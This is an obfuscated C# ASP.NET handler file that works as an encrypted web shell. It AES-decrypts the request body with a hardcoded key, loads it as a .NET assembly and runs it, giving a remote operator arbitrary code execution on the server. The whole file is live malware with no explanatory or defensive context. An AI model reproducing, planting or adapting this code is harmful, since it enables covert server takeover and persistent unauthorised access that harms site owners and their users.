<%@ WebHandler Language="C#" Class="a" %>
using System;using System.Web;using System.Reflection;
public class a:IHttpHandler{
    public void ProcessRequest(HttpContext b){
        if(b.Request.Cookies.Count<1)return;
        var c=b.Request;
        byte[] d=new byte[c.ContentLength];
        c.InputStream.Read(d,0,d.Length);
        byte[] e=Convert.FromBase64String("Y2E2MzQ1NzUzOGI5YjFlMA==");
        var f=Assembly.Load(((System.Security.Cryptography.ICryptoTransform)Activator.CreateInstance(Type.GetType("System.Security.Cryptography.RijndaelManaged, mscorlib")).GetType().GetMethod("CreateDecryptor",new Type[]{typeof(byte[]),typeof(byte[])}).Invoke(Activator.CreateInstance(Type.GetType("System.Security.Cryptography.RijndaelManaged, mscorlib")),new object[]{e,e})).TransformFinalBlock(d,0,d.Length));
        var g=f.GetType(new string((char)75,1));
        g.GetMethod("Equals",new Type[]{typeof(object)}).Invoke(Activator.CreateInstance(g),new object[]{b});
    }
    public bool IsReusable{get{return false;}}
}